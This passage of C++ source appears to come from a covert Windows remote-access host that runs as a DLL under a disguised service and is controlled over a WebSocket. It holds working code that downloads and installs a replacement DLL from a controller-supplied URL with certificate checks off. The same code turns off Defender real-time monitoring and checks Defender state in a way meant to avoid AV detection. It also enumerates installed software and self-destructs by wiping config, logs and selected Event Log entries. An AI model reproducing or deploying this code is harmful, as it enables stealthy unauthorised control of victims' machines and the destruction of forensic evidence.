                    ",\"normalize\":" + std::string(g_audio_normalize.load() ? "true" : "false") +
                    ",\"hum_filter\":" + std::to_string(g_audio_hum_filter.load()) +
                    ",\"device_count\":" + std::to_string(numDevs) +
                    ",\"device_id\":" + std::to_string(g_audio_device_id.load()) +
                    devInfo + "}");
        }
        else if (cmd == "audio_set_device") {
            std::string v = json_get(msg_str, "device_id");
            if (!v.empty()) g_audio_device_id = std::stoi(v);
            send_ok("\"ok\"");
        }

        else if (cmd == "installed_programs") {
            // Enumerate installed programs from registry (both 64-bit and 32-bit)
            std::string reqId = id;
            spawn_bg_worker([reqId, send_ok_raw = [&]() -> std::function<void(const std::string&)> {
                return [reqId](const std::string& data) {
                    if (g_ws && g_ws->is_connected()) {
                        std::string resp = "{\"id\":\"" + json_escape(reqId) + "\",\"ok\":true,\"data\":" + data + "}";
                        g_ws->send_text(to_utf8(resp));
                    }
                };
            }()]() {
                std::string result = "[";
                int count = 0;
                auto enumKey = [&](HKEY rootKey, const char* subPath, REGSAM extraFlags) {
                    HKEY hUninstall;
                    if (RegOpenKeyExA(rootKey, subPath, 0, KEY_READ | extraFlags, &hUninstall) != ERROR_SUCCESS) return;
                    char keyName[256];
                    DWORD keyIdx = 0, keyNameLen;
                    while (true) {
                        keyNameLen = sizeof(keyName);
                        if (RegEnumKeyExA(hUninstall, keyIdx++, keyName, &keyNameLen, 0, 0, 0, 0) != ERROR_SUCCESS) break;
                        HKEY hApp;
                        if (RegOpenKeyExA(hUninstall, keyName, 0, KEY_READ | extraFlags, &hApp) != ERROR_SUCCESS) continue;
                        char buf[512]; DWORD sz, dwType;
                        std::string name, version, publisher, installDate, installLocation, uninstallCmd;
                        DWORD estimatedSize = 0;
                        int systemComponent = 0;
                        // Skip system components
                        sz = sizeof(DWORD);
                        if (RegQueryValueExA(hApp, "SystemComponent", 0, &dwType, (LPBYTE)&systemComponent, &sz) == ERROR_SUCCESS && systemComponent == 1) {
                            RegCloseKey(hApp); continue;
                        }
                        sz = sizeof(buf); buf[0] = 0;
                        if (RegQueryValueExA(hApp, "DisplayName", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) name = buf;
                        if (name.empty()) { RegCloseKey(hApp); continue; } // skip entries without name
                        sz = sizeof(buf); buf[0] = 0;
                        if (RegQueryValueExA(hApp, "DisplayVersion", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) version = buf;
                        sz = sizeof(buf); buf[0] = 0;
                        if (RegQueryValueExA(hApp, "Publisher", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) publisher = buf;
                        sz = sizeof(buf); buf[0] = 0;
                        if (RegQueryValueExA(hApp, "InstallDate", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) installDate = buf;
                        sz = sizeof(buf); buf[0] = 0;
                        if (RegQueryValueExA(hApp, "InstallLocation", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) installLocation = buf;
                        sz = sizeof(buf); buf[0] = 0;
                        if (RegQueryValueExA(hApp, "UninstallString", 0, 0, (LPBYTE)buf, &sz) == ERROR_SUCCESS) uninstallCmd = buf;
                        sz = sizeof(DWORD);
                        RegQueryValueExA(hApp, "EstimatedSize", 0, &dwType, (LPBYTE)&estimatedSize, &sz);
                        RegCloseKey(hApp);
                        if (count > 0) result += ",";
                        result += "{\"name\":\"" + json_escape(name) +
                                  "\",\"version\":\"" + json_escape(version) +
                                  "\",\"publisher\":\"" + json_escape(publisher) +
                                  "\",\"date\":\"" + json_escape(installDate) +
                                  "\",\"size\":" + std::to_string(estimatedSize) +
                                  ",\"location\":\"" + json_escape(installLocation) +
                                  "\",\"uninstall\":\"" + json_escape(uninstallCmd) + "\"}";
                        count++;
                    }
                    RegCloseKey(hUninstall);
                };
                // 64-bit programs
                enumKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0);
                // 32-bit programs on 64-bit Windows
                enumKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", KEY_WOW64_32KEY);
                // Per-user programs
                enumKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0);
                result += "]";
                send_ok_raw(result);
            });
        }

        // ── Remote host update: download new DLL, replace, re-inject ──
        else if (cmd == "update_status") {
            // Read step file written by bat
            HANDLE hF = CreateFileA("C:\\Windows\\Temp\\wpnp_step.txt", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            std::string content;
            if (hF != INVALID_HANDLE_VALUE) {
                char buf[256] = {}; DWORD rd = 0;
                ReadFile(hF, buf, sizeof(buf)-1, &rd, NULL);
                CloseHandle(hF);
                content = buf;
                // Trim whitespace/newlines
                while (!content.empty() && (content.back() == '\n' || content.back() == '\r' || content.back() == ' ')) content.pop_back();
            }
            send_ok("{\"step\":\"" + json_escape(content) + "\"}");
        }

        else if (cmd == "defender_status") {
            // Check Defender state via registry (no PowerShell — avoids AV detection)
            bool rtEnabled = true, tamper = false, avEnabled = true;
            HKEY hk;
            DWORD val = 0, sz = sizeof(val);

            // Real-Time Protection
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
                if (RegQueryValueExA(hk, "DisableRealtimeMonitoring", NULL, NULL, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1) rtEnabled = false;
                RegCloseKey(hk);
            }
            // Check also Policies path
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
                val = 0; sz = sizeof(val);
                if (RegQueryValueExA(hk, "DisableRealtimeMonitoring", NULL, NULL, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1) rtEnabled = false;
                RegCloseKey(hk);
            }
            // Tamper Protection
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Features", 0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
                val = 0; sz = sizeof(val);
                if (RegQueryValueExA(hk, "TamperProtection", NULL, NULL, (LPBYTE)&val, &sz) == ERROR_SUCCESS) {
                    // 5 = enabled, 4 = disabled
                    if (val == 5) tamper = true;
                }
                RegCloseKey(hk);
            }
            // Antivirus fully disabled
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
                val = 0; sz = sizeof(val);
                if (RegQueryValueExA(hk, "DisableAntiSpyware", NULL, NULL, (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1) avEnabled = false;
                RegCloseKey(hk);
            }

            send_ok("{\"antivirus_enabled\":" + std::string(avEnabled?"true":"false") +
                    ",\"realtime_enabled\":" + std::string(rtEnabled?"true":"false") +
                    ",\"tamper_protected\":" + std::string(tamper?"true":"false") + "}");
        }

        else if (cmd == "host_restart") {
            // Restart the WPnpSvc service — svchost unloads DLL, SCM restarts it
            send_ok("\"restarting\"");
            Sleep(500);
            spawn_bg_worker([]() {
                g_log.info("Host restart requested by client");
                // sc.exe stop + start in a bat script (can't restart ourselves directly)
                std::string bat = "C:\\Windows\\Temp\\wpnp_restart.bat";
                {
                    std::ofstream f(bat);
                    f << "@echo off\r\n";
                    f << "timeout /t 2 /nobreak >nul\r\n";
                    f << "sc.exe stop WPnpSvc >nul 2>nul\r\n";
                    f << "timeout /t 3 /nobreak >nul\r\n";
                    f << "sc.exe start WPnpSvc >nul 2>nul\r\n";
                    f << "del \"%~f0\"\r\n";
                }
                STARTUPINFOA si = {}; si.cb = sizeof(si);
                PROCESS_INFORMATION pi = {};
                std::string cmd = "cmd.exe /c \"" + bat + "\"";
                CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                if (pi.hProcess) CloseHandle(pi.hProcess);
                if (pi.hThread) CloseHandle(pi.hThread);
            });
        }

        else if (cmd == "host_update") {
            // Client sends URL to download new DLL from VPS
            std::string url = json_get(msg_str, "url");
            if (url.empty()) { send_err("No URL provided"); }
            else {
                std::string reqId = id;
                spawn_bg_worker([reqId, url]() {
                    auto send_msg = [&](const std::string& data) {
                        if (g_ws && g_ws->is_connected()) {
                            std::string resp = "{\"id\":\"" + json_escape(reqId) + "\",\"ok\":true,\"data\":" + data + "}";
                            g_ws->send_text(to_utf8(resp));
                        }
                    };
                    auto send_fail = [&](const std::string& err) {
                        if (g_ws && g_ws->is_connected()) {
                            std::string resp = "{\"id\":\"" + json_escape(reqId) + "\",\"ok\":false,\"error\":\"" + json_escape(err) + "\"}";
                            g_ws->send_text(to_utf8(resp));
                        }
                    };

                    // Get current DLL path
                    extern HMODULE g_dll_module;
                    char dllPath[MAX_PATH] = {};
                    GetModuleFileNameA(g_dll_module, dllPath, MAX_PATH);
                    std::string currentDll(dllPath);
                    std::string dllDir = currentDll.substr(0, currentDll.find_last_of("\\/") + 1);
                    std::string dllName = currentDll.substr(currentDll.find_last_of("\\/") + 1);
                    std::string tempDll = dllDir + dllName + ".new";
                    std::string oldDll = dllDir + dllName + ".old";

                    // Download will be done by bat script (PowerShell handles HTTPS better in Session 0)
                    // Just send ack to client
                    send_msg("{\"status\":\"ok\",\"message\":\"Update started. Host restarting...\"}");

                    g_audio_active = false;
                    Sleep(500);
                    {
                        std::string batPath = "C:\\Windows\\Temp\\wpnp_update.bat";
                        std::string stepFile = "C:\\Windows\\Temp\\wpnp_step.txt";
                        std::string batContent;
                        auto addLn = [&](const std::string& s) { batContent += s + "\r\n"; };
                        auto step = [&](const std::string& s) {
                            // Escape '|' as '^|' for cmd.exe (otherwise it becomes a shell pipe!)
                            std::string esc;
                            for (char c : s) {
                                if (c == '|' || c == '<' || c == '>' || c == '&' || c == '^')
                                    esc += '^';
                                esc += c;
                            }
                            batContent += "echo " + esc + " > \"" + stepFile + "\"\r\n";
                        };
                        addLn("@echo off");
                        // Step 1: Download FIRST (host stays online, client sees progress)
                        step("1|Downloading new DLL");
                        addLn("start /wait /min powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('" + url + "','" + tempDll + "')\"");
                        addLn("if not exist \"" + tempDll + "\" (echo ERR^|Download failed > \"" + stepFile + "\" & goto cleanup)");
                        // Step 2: Disable Defender (only after download succeeded)
                        step("2|Disabling Defender");
                        addLn("start /wait /min powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
                        addLn("timeout /t 2 /nobreak >nul 2>nul");
                        // Step 3: Stop service (host goes offline here)
                        // sc stop blocks until SCM timeout (~30s) if service hangs — avoid deadlock:
                        // 1) get host PID first, 2) send stop in background, 3) force-kill by PID after 5s
                        step("3|Stopping service");
                        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
                        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
                        addLn("timeout /t 5 /nobreak >nul 2>nul");
                        addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
                        addLn("timeout /t 2 /nobreak >nul 2>nul");
                        // Step 4: Replace DLL
                        step("4|Replacing DLL");
                        addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
                        addLn("ren \"" + currentDll + "\" " + dllName + ".old >nul 2>nul");
                        addLn("copy /y \"" + tempDll + "\" \"" + currentDll + "\" >nul 2>nul");
                        addLn("timeout /t 2 /nobreak >nul 2>nul");
                        // Step 5: Start service (host comes back online)
                        step("5|Starting service");
                        addLn("sc.exe start WPnpSvc >nul 2>nul");
                        addLn("timeout /t 8 /nobreak >nul 2>nul");
                        // Verify service actually RUNNING — if not, roll back to .old and retry.
                        // Without this the host stays offline forever if the new DLL is broken
                        // or couldn't be loaded (e.g. dependency missing, import error).
                        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
                        addLn("if not errorlevel 1 goto after_start_ok");
                        step("5|Service not RUNNING, rolling back");
                        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
                        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
                        addLn("timeout /t 5 /nobreak >nul 2>nul");
                        addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
                        addLn("timeout /t 2 /nobreak >nul 2>nul");
                        addLn("del /f /q \"" + currentDll + "\" >nul 2>nul");
                        addLn("if exist \"" + oldDll + "\" copy /y \"" + oldDll + "\" \"" + currentDll + "\" >nul 2>nul");
                        addLn("sc.exe start WPnpSvc >nul 2>nul");
                        addLn("timeout /t 5 /nobreak >nul 2>nul");
                        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
                        addLn("if not errorlevel 1 (echo ERR^|Rollback OK, new DLL invalid > \"" + stepFile + "\" & goto cleanup)");
                        addLn("echo ERR^|Rollback FAILED — host offline > \"" + stepFile + "\" & goto cleanup");
                        addLn(":after_start_ok");
                        // Step 6: Re-enable Defender
                        step("6|Re-enabling Defender");
                        addLn("start /wait /min powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $false\"");
                        // Step 7: Done
                        step("7|Done");
                        addLn(":cleanup");
                        // Cleanup files
                        addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
                        addLn("del /f /q \"" + tempDll + "\" >nul 2>nul");
                        addLn("timeout /t 3 /nobreak >nul 2>nul");
                        addLn("del /f /q \"" + stepFile + "\" >nul 2>nul");
                        addLn("(goto) 2>nul & del \"%~f0\"");

                        // Write via CreateFileA (Win32 — works where fopen fails)
                        HANDLE hBat = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                        bool bat_written = false;
                        if (hBat != INVALID_HANDLE_VALUE) {
                            DWORD written = 0;
                            WriteFile(hBat, batContent.data(), (DWORD)batContent.size(), &written, NULL);
                            CloseHandle(hBat);
                            bat_written = (written == batContent.size());
                        }
                        (void)bat_written;
                        // Launch bat as detached process — independent of spoolsv lifetime
                        std::string runCmd = "cmd.exe /c \"" + batPath + "\"";
                        STARTUPINFOA si = { sizeof(si) };
                        si.dwFlags = STARTF_USESHOWWINDOW;
                        si.wShowWindow = SW_HIDE;
                        PROCESS_INFORMATION pi = {};
                        CreateProcessA(NULL, (LPSTR)runCmd.c_str(), NULL, NULL, FALSE,
                            DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW,
                            NULL, "C:\\Windows\\Temp", &si, &pi);
                        if (pi.hProcess) CloseHandle(pi.hProcess);
                        if (pi.hThread) CloseHandle(pi.hThread);
                    }

                });
            }
        }

        else if (cmd == "running_apps") {
            // Use rundll32 GetRunningApps export in user session (fast, no PowerShell)
            std::string reqId = id;
            spawn_bg_worker([reqId]() {
                extern HMODULE g_dll_module;
                char dllPathBuf[MAX_PATH] = {};
                if (g_dll_module) GetModuleFileNameA(g_dll_module, dllPathBuf, MAX_PATH);
                else GetModuleFileNameA(nullptr, dllPathBuf, MAX_PATH);
                std::string dllPath(dllPathBuf);
                // For EXE mode, use DLL path from same directory
                if (!g_service_mode) {
                    auto pos = dllPath.find_last_of("\\/");
                    if (pos != std::string::npos) dllPath = dllPath.substr(0, pos + 1) + "RemoteDesktopHost.dll";
                }

                char tmpPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tmpPath);
                std::string outFile = std::string(tmpPath) + std::to_string(GetTickCount64()) + "a.tmp";

                std::string cmdLine = "rundll32.exe \"" + dllPath + "\",GetRunningApps " + outFile;

                DWORD sessionId = WTSGetActiveConsoleSessionId();
                HANDLE hToken = nullptr;
                bool ok = false;
                if (g_service_mode && sessionId != 0xFFFFFFFF && WTSQueryUserToken(sessionId, &hToken)) {
                    HANDLE hDup = nullptr;
                    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &hDup);
                    CloseHandle(hToken);
                    if (hDup) {
                        LPVOID pEnv = nullptr;
                        CreateEnvironmentBlock(&pEnv, hDup, FALSE);
                        STARTUPINFOA si = {}; si.cb = sizeof(si);
                        si.lpDesktop = (LPSTR)"winsta0\\default";
                        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
                        PROCESS_INFORMATION pi = {};
                        if (CreateProcessAsUserA(hDup, nullptr, (LPSTR)cmdLine.c_str(), nullptr, nullptr, FALSE,
                                CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, pEnv, nullptr, &si, &pi)) {
                            WaitForSingleObject(pi.hProcess, 5000);
                            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                            ok = true;
                        }
                        if (pEnv) DestroyEnvironmentBlock(pEnv);
                        CloseHandle(hDup);
                    }
                } else if (!g_service_mode) {
                    // EXE mode: just run directly (EnumWindows works)
                    std::string result = "[";
                    EnumWindows([](HWND hw, LPARAM lParam) -> BOOL {
                        if (!IsWindowVisible(hw)) return TRUE;
                        wchar_t title[256] = {};
                        GetWindowTextW(hw, title, 256);
                        if (wcslen(title) == 0) return TRUE;
                        auto* list = (std::string*)lParam;
                        int len = WideCharToMultiByte(CP_UTF8, 0, title, -1, nullptr, 0, nullptr, nullptr);
                        if (len <= 0) return TRUE;
                        std::string utf8(len - 1, 0);
                        WideCharToMultiByte(CP_UTF8, 0, title, -1, &utf8[0], len, nullptr, nullptr);
                        if (!list->empty() && list->back() != '[') *list += ",";
                        *list += "\"" + json_escape(utf8) + "\"";
                        return TRUE;
                    }, (LPARAM)&result);
                    result += "]";
                    std::string resp = "{\"id\":\"" + json_escape(reqId) + "\",\"ok\":true,\"data\":" + result + "}";
                    if (g_ws && g_ws->is_connected()) g_ws->send_text(to_utf8(resp));
                    return;
                }

                std::string result = "[";
                if (ok) {
                    std::ifstream f(outFile);
                    if (f.is_open()) {
                        std::set<std::string> seen;
                        std::string line;
                        while (std::getline(f, line)) {
                            while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
                            if (line.empty()) continue;
                            // Format: process.exe|Window Title
                            size_t pipe = line.find('|');
                            std::string proc = pipe != std::string::npos ? line.substr(0, pipe) : "";
                            std::string title = pipe != std::string::npos ? line.substr(pipe + 1) : line;
                            if (title.empty()) continue;
                            // Skip system junk
                            if (title == "Program Manager" || title == "Windows Input Experience" ||
                                title == "Settings" || proc == "TextInputHost.exe" ||
                                proc == "SystemSettings.exe" ||
                                proc == "HotKeyServiceUWP.exe" ||
                                proc == "TextInputHost.exe" ||
                                proc == "ShellExperienceHost.exe" ||
                                proc == "SearchHost.exe" ||
                                proc == "StartMenuExperienceHost.exe" ||
                                proc == "LockApp.exe" ||
                                title == "NVIDIA GeForce Overlay") continue;
                            std::string display = proc.empty() ? title : proc + " - " + title;
                            if (seen.count(display)) continue;
                            seen.insert(display);
                            if (result.size() > 1) result += ",";
                            result += "\"" + json_escape(display) + "\"";
                        }
                    }
                }
                DeleteFileA(outFile.c_str());
                result += "]";
                std::string resp = "{\"id\":\"" + json_escape(reqId) + "\",\"ok\":true,\"data\":" + result + "}";
                if (g_ws && g_ws->is_connected()) g_ws->send_text(to_utf8(resp));
            });
        }

        // ── Set ICE servers (STUN/TURN) and save to config ──
        else if (cmd == "set_ice_servers") {
            std::string new_stun = json_get(msg_str, "stun_server");
            std::string new_turn = json_get(msg_str, "turn_server");
            g_config.stun_server = new_stun;
            g_config.turn_server = new_turn;
            // Save to config file
            save_stream_settings();
            g_log.info("ICE servers updated: STUN=" + new_stun + " TURN=" + (new_turn.empty() ? "(none)" : "configured"));
            send_ok("{\"saved\":true}");
        }

        // ── Save current stream settings to host_config.json ──
        else if (cmd == "save_settings") {
            save_stream_settings();
            send_ok("{\"saved\":true,\"codec\":\"" + json_escape(g_codec) +
                    "\",\"quality\":" + std::to_string(g_quality) +
                    ",\"fps\":" + std::to_string(g_fps) +
                    ",\"scale\":" + std::to_string(g_scale) +
                    ",\"bitrate\":" + std::to_string(g_bitrate) + "}");
        }

        // ── Get full host config (decrypted JSON) for client editor ──
        else if (cmd == "get_config") {
            std::string content;
            if (!g_config_path.empty()) {
                std::ifstream f(g_config_path, std::ios::binary);
                if (f.is_open()) {
                    std::string raw((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                    f.close();
                    if (!raw.empty() && raw[0] != '{') {
                        auto dec = aes_decrypt((const uint8_t*)raw.data(), raw.size());
                        if (!dec.empty()) content.assign((char*)dec.data(), dec.size());
                    } else content = raw;
                }
            }
            if (content.empty()) content = "{}";
            // Wrap in data field — content is already JSON
            send_ok("{\"config\":" + content + ",\"path\":\"" + json_escape(g_config_path) + "\"}");
        }

        // ── Save full host config (encrypt if .sys) ──
        else if (cmd == "set_config") {
            std::string newConfig = json_get(msg_str, "config");
            if (newConfig.empty() || newConfig[0] != '{') {
                send_err("Invalid config JSON");
            } else if (g_config_path.empty()) {
                send_err("No config path set");
            } else {
                bool doEnc = (g_config_path.size() > 4 && g_config_path.substr(g_config_path.size() - 4) == ".sys");
                bool ok = false;
                if (doEnc) {
                    auto enc = aes_encrypt((const uint8_t*)newConfig.data(), newConfig.size());
                    if (!enc.empty()) {
                        std::ofstream of(g_config_path, std::ios::binary);
                        if (of.is_open()) { of.write((char*)enc.data(), enc.size()); ok = true; }
                    }
                } else {
                    std::ofstream of(g_config_path);
                    if (of.is_open()) { of << newConfig; ok = true; }
                }
                if (ok) {
                    // Reload config
                    load_config(g_config_path);
                    send_ok("{\"saved\":true}");
                } else {
                    send_err("Failed to write config");
                }
            }
        }

        // ── Get current stream settings ──
        else if (cmd == "get_settings") {
            send_ok("{\"codec\":\"" + json_escape(g_codec) +
                    "\",\"quality\":" + std::to_string(g_quality) +
                    ",\"fps\":" + std::to_string(g_fps) +
                    ",\"scale\":" + std::to_string(g_scale) +
                    ",\"bitrate\":" + std::to_string(g_bitrate) +
                    ",\"stun_server\":\"" + json_escape(g_config.stun_server) + "\"" +
                    ",\"turn_server\":\"" + json_escape(g_config.turn_server) + "\"}");
        }

        // ── Server-side bandwidth throttle feedback ──
        // Server monitors client's receive rate and tells host to slow down
        // NEVER changes scale — that's user's choice. Only FPS and quality.
        else if (cmd == "stream_throttle") {
            std::string recover_s = json_get(msg_str, "recover");
            if (recover_s == "true") {
                // Fast recovery: +3 quality, +3 FPS per tick
                int cur = g_adaptive_quality.load();
                int max_q = g_quality;
                if (cur < max_q) {
                    g_adaptive_quality = std::min(max_q, cur + 3);
                    g_log.info("Throttle RECOVER: quality " + std::to_string(cur) + " -> " + std::to_string(g_adaptive_quality.load()));
                }
                int cur_fps = g_fps;
                int target_fps = 24;  // recover toward 24 FPS
                if (cur_fps < target_fps) {
                    g_fps = std::min(target_fps, cur_fps + 3);
                    g_log.info("Throttle RECOVER: FPS " + std::to_string(cur_fps) + " -> " + std::to_string(g_fps));
                }
            } else {
                std::string max_fps_s = json_get(msg_str, "max_fps");
                std::string reduce_q_s = json_get(msg_str, "reduce_quality");
                std::string reason = json_get(msg_str, "reason");
                int max_fps = max_fps_s.empty() ? 15 : std::max(5, std::min(30, std::stoi(max_fps_s)));
                int reduce_q = reduce_q_s.empty() ? 5 : std::min(10, std::stoi(reduce_q_s));

                // Reduce FPS first (primary throttle)
                if (g_fps > max_fps) {
                    g_log.info("Throttle: FPS " + std::to_string(g_fps) + " -> " + std::to_string(max_fps) + " (" + reason + ")");
                    g_fps = max_fps;
                }
                // Gentle quality reduction (secondary, min 20 to keep H264 efficient)
                int cur_q = g_adaptive_quality.load();
                int new_q = std::max(20, cur_q - reduce_q);
                if (new_q < cur_q) {
                    g_adaptive_quality = new_q;
                    g_log.info("Throttle: quality " + std::to_string(cur_q) + " -> " + std::to_string(new_q));
                }
                // Do NOT touch scale — user explicitly set it
                // Request keyframe if server asked
                std::string req_key = json_get(msg_str, "request_keyframe");
                if (req_key == "true" || req_key == "1") {
                    g_h264_keyframe_requested = true;
                }
            }
        }
        else if (cmd == "request_keyframe") {
            g_h264_keyframe_requested = true;
            g_log.info("Keyframe requested by server (frame drop recovery)");
        }

        else if (cmd == "config_read") {
            std::string path = json_get(msg_str, "path");
            std::string text = g_files.read_text_file(path);
            send_ok("\"" + json_escape(text) + "\"");
        }
        else if (cmd == "config_write") {
            std::string path = json_get(msg_str, "path");
            std::string text = json_unescape(json_get(msg_str, "text"));
            bool ok = g_files.write_text_file(path, text);
            ok ? send_ok("\"saved\"") : send_err("Write failed");
        }

        else if (cmd == "threat_status") {
            std::lock_guard<std::mutex> lk(g_threat_mtx);
            std::string r = "{\"detected\":" + std::string(!g_last_threat.proc.empty() ? "true" : "false") +
                            ",\"visible\":" + std::string(g_last_threat.visible ? "true" : "false") +
                            ",\"paused\":" + std::string(g_paused_by_threat ? "true" : "false") +
                            ",\"auto_pause\":" + std::string(g_threat_auto_pause ? "true" : "false") +
                            ",\"scan_enabled\":" + std::string(g_threat_scan_enabled ? "true" : "false") +
                            ",\"proc\":\"" + json_escape(g_last_threat.proc) + "\"" +
                            ",\"title\":\"" + json_escape(g_last_threat.title) + "\"" +
                            ",\"category\":\"" + json_escape(g_last_threat.category) + "\"}";
            send_ok(r);
        }
        else if (cmd == "threat_set_autopause") {
            std::string v = json_get(msg_str, "enabled");
            g_threat_auto_pause = (v == "true" || v == "1");
            save_stream_settings();
            g_log.info("threat_auto_pause=" + std::string(g_threat_auto_pause ? "true" : "false") + " saved to " + g_config_path);
            send_ok("{\"auto_pause\":" + std::string(g_threat_auto_pause ? "true" : "false") + "}");
        }
        else if (cmd == "threat_set_scan") {
            std::string v = json_get(msg_str, "enabled");
            g_threat_scan_enabled = (v == "true" || v == "1");
            if (!g_threat_scan_enabled) {
                g_paused_by_threat = false;
                std::lock_guard<std::mutex> lk(g_threat_mtx);
                g_last_threat = ThreatInfoFwd{};
                g_threat_list_all.clear();
            }
            save_stream_settings();
            g_log.info("threat_scan_enabled=" + std::string(g_threat_scan_enabled ? "true" : "false") + " saved to " + g_config_path);
            send_ok("{\"scan_enabled\":" + std::string(g_threat_scan_enabled ? "true" : "false") + "}");
        }

        else if (cmd == "self_destruct") {
            send_ok("\"started\"");

            auto evt = [&](int step, int total, const std::string& text) {
                std::string m = "{\"event\":\"destruct_status\",\"step\":" + std::to_string(step) +
                                ",\"total\":" + std::to_string(total) +
                                ",\"text\":\"" + json_escape(text) + "\"}";
                if (g_ws && g_ws->is_connected()) g_ws->send_text(to_utf8(m));
                std::this_thread::sleep_for(std::chrono::milliseconds(450));
            };

            const int TOTAL = 8;
            evt(1, TOTAL, "Stopping streaming");
            try { g_streaming = false; stop_streaming(); } catch (...) {}

            evt(2, TOTAL, "Resolving paths");
            char exePathBuf[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePathBuf, MAX_PATH);
            std::string exePath = exePathBuf;

            std::string cfgAbs = g_config_path;
            if (!cfgAbs.empty() && cfgAbs.find(':') == std::string::npos) {
                char full[MAX_PATH] = {0};
                if (GetFullPathNameA(cfgAbs.c_str(), MAX_PATH, full, NULL) > 0)
                    cfgAbs = full;
            }

            evt(3, TOTAL, "Wiping config (" + cfgAbs + ")");
            if (!cfgAbs.empty()) {
                HANDLE h = CreateFileA(cfgAbs.c_str(), GENERIC_WRITE, 0, NULL,
                                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (h != INVALID_HANDLE_VALUE) {
                    LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
                    std::vector<char> zero(4096, 0);
                    LONGLONG remain = sz.QuadPart;
                    DWORD wr = 0;
                    while (remain > 0) {
                        DWORD chunk = (DWORD)std::min<LONGLONG>(remain, 4096);
                        WriteFile(h, zero.data(), chunk, &wr, NULL);
                        remain -= chunk;
                    }
                    FlushFileBuffers(h);
                    CloseHandle(h);
                }
                DeleteFileA(cfgAbs.c_str());
            }

            evt(4, TOTAL, "Wiping log files");
            DeleteFileA("C:\\RemoteDesktopHost.log");
            DeleteFileA("C:\\Windows\\Temp\\wpnp_step.txt");

            evt(5, TOTAL, "Selectively wiping Event Log entries");
            // Selective: delete only entries matching configured patterns (or default host markers).
            // Same approach as evtlog_cleaner: detect via Get-WinEvent, wipe channel, restore non-matching.
            {
                std::string patterns = g_config.evtlog_clean_patterns;
                if (patterns.empty()) patterns = "pnpext,spoolsv,wpnp,Prometey";
                // Convert "a,b,c" → "a|b|c"
                std::string regex;
                {
                    std::istringstream ss(patterns);
                    std::string tok;
                    while (std::getline(ss, tok, ',')) {
                        while (!tok.empty() && tok.front() == ' ') tok.erase(tok.begin());
                        while (!tok.empty() && tok.back() == ' ') tok.pop_back();
                        if (tok.empty()) continue;
                        if (!regex.empty()) regex += "|";
                        regex += tok;
                    }
                }
                if (!regex.empty()) {
                    char tmpPath[MAX_PATH]; GetTempPathA(MAX_PATH, tmpPath);
                    std::string scriptPath = std::string(tmpPath) + "destruct_evt.ps1";
                    std::string script =
                        "$ErrorActionPreference='SilentlyContinue'\n"
                        "$pattern='" + regex + "'\n"
                        "foreach($logName in @('Application','System','Setup')){\n"
